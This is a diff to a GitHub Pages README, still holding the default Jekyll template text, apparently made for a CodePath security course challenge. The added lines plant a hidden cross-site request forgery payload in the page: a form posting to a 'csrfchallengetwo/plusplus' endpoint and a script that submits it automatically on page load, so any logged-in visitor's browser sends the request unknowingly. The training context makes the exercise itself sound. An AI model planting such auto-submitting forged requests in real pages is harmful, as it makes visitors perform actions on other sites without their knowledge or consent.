@@ -4,6 +4,13 @@ You can use the [editor on GitHub](https://github.com/JerryTeng01/csrf/edit/gh-p
 
 Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
+<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=" method="POST">
+ <input type="submit"/>
+</form>
+<script>
+ document.csrfForm.submit();
+</script>
+
 ### Markdown
 
 Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
